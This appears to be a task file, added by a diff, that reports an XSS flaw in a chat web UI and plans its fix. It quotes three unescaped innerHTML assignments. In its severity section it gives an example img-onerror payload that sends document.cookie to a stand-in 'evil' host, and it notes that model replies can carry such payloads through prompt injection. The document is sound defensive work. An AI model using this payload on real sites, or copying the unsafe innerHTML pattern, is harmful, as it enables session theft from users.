+# [P0] Sanitize HTML sinks in ghost_bridge_server chat UI (XSS via user prompt and model reply)
+
+## Task ID
+`bridge-20261027-ghost-bridge-xss`
+
+## Target repository
+`Supremeai-bd/supremeai-browser` (tracked on the public `supremeai-open` task board per federation policy).
+
+## Severity
+**P0 — stored/reflected XSS surface in a served web UI.** User prompt text, the model's reply, and even error messages are written into the DOM via `innerHTML` with no escaping or sanitization.
+
+## Verified evidence (pulled live via MCP tower, 2026-10-26)
+- `github_read_file {repo:"supremeai-browser", path:"ghost_tower/ghost_bridge_server.py"}` (12,084 chars) contains **3 `innerHTML` sinks**:
+  1. `msg.innerHTML = text.replace(/\n/g, '<br>');` — user prompt text (attacker-controlled)
+  2. `botBubble.innerHTML = (data.reply || "No reply").replace(/\n/g, '<br>');` — Gemini reply (model/indirect attacker-controlled)
+  3. `botBubble.innerHTML = "⚠️ ত্রুটি: " + err.message;` — error message (reflection vector)
+- No `textContent`, `createTextNode`, escaping, or DOMPurify-style sanitizer appears on these paths.
+
+## Why this blocks production
+- A prompt like `<img src=x onerror="fetch('https://evil?c='+document.cookie)">` renders as live HTML in every participant's browser. Model output and upstream errors can carry the same payloads (indirect prompt injection).
+- The chat page has no CSP evidence that would reliably mitigate inline event handlers.
+
+## Remediation plan (smallest safe change)
+1. Render messages with `textContent` first, then apply the newline→line-break transformation safely (e.g. split on `\n`, append text nodes and `<br>` elements) — or escape HTML entities before any `innerHTML` assignment.
+2. Apply the same fix to all three sinks (user, reply, error).
+3. Add a regression test: submit `<img src=x onerror=...>` as a prompt; assert it appears as text, not as an element.
+4. Optional hardening (follow-up, not this scope): add a strict CSP header to the served page.
+
+## Acceptance criteria
+- [ ] No unescaped `innerHTML` assignment remains on user/reply/error paths in `ghost_bridge_server.py`
+- [ ] XSS payload regression test green
+- [ ] Manual smoke: chat round-trip still renders newlines correctly
+
+## Related orders
+- Audit "SupremeAI সমন্বিত Executive Diagnosis" (2026-10-26), P0 item 4 (XSS risk).
